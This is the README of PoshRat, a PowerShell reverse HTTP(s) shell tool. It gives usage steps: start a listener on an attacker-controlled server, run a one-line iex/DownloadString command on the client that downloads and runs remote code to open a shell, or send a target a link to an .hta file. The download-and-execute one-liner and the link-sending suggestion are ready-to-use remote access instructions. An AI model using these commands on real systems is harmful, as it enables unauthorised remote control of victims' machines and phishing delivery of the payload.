PoshRat
=======

PowerShell Reverse HTTP(s) Shell

1. Invoke PoshRat.ps1 On An A server you control.  Requires Admin rights to listen on ports.
2. To Spawn The Reverse Shell Run On Client

   iex (New-Object Net.WebClient).DownloadString("http://[ServerIP]/connect")
3. [OR] Browse to or send link to [serverip]/app.hta

Created By Casey Smith @subTee
